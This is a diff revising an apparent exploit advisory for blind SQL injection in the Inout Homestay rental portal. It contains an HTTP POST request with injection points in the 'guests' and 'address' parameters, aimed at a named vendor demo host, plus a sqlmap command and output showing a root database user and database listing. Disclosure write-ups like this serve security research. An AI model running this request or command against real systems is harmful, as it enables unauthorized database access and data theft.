@@ -14,11 +14,11 @@ Exploit Author      : Mohamed N. Ali @MohamedNab1l
 # Description
 <br>
 
-Inout Homestay is a rental portal application, it suffers from two blind SQL injection. Both "guests" and "address" POST parameters are vulnerable.
-This will allow remote non-authenticated attackers not only to break the SQL syntax, but it is also possible to utilise a UNION SELECT query to reflect sensitive information such as the current database version, database users and collect system info. This could result in full information disclosure.
+Inout Homestay is a rental portal application, it suffers from two blind SQL injection. Both POST parameters "guests" and "address" are vulnerable.
+exploiting this vulnerablity will allow remote non-authenticated attackers not only to break the SQL syntax, but it is also possible to utilise a UNION SELECT query to reflect sensitive information such as the current database version, database users and collect system info. This could result in full information disclosure.
 <br>
 
-## Vulnerable Parameter: guests (POST)
+## Vulnerable Parameters: guests and address (POST)
 
 <br>
 
@@ -28,28 +28,23 @@ Vulnerability File: index.php
 
 ### HTTP Post Request
 `
-POST /index.php?page=search/searchdetailed HTTP/1.1
+POST /index.php?page=search/rentals HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
-Referer: http://vulnerable-host.com
+Referer: http://inout-homestay.demo.inoutscripts.net/
 Cookie: currencyid=10; currencycode=BYR; language=2; io_lang_code=es
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate,br
-Content-Length: 270
+Content-Length: 189
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
-Host: vulnerable-host.com
+Host: inout-homestay.demo.inoutscripts.net
 Connection: Keep-alive
-address=0 INJECT_SQL_HERE_ &bathr=&beds=&broom=&indate=01/01/1967&lat=1&location=1&longi=1&numguest=1&option=&outdate=01/01/1967&page=1&pend=NaN&property1=&property2=&property3=&pstart=NaN&type=1&userseachcity=San%20Francisco&userseachstate=NY
-
-
-
+address=3[inject_sql_here]&guests=-1[or_inject_sql_here]&indate=01/01/1967&lat=1&location=1&long=1&outdate=01/01/1967&searchcity=San%20Francisco&searchstate=NY
 `
 <br>
 ### Sqlmap command:
 `
 python sqlmap.py -r homestay.txt  -p guests --dbms=MySQL --banner --random-agent --current-db --dbs --current-user
-
-
 `
 <br>
 
@@ -77,7 +72,6 @@ current user: 'root@localhost'
 current database: 'inout_homestay'
 [22:00:43] [INFO] fetching database names
 available databases [50]:
-
 
 `
 <br>
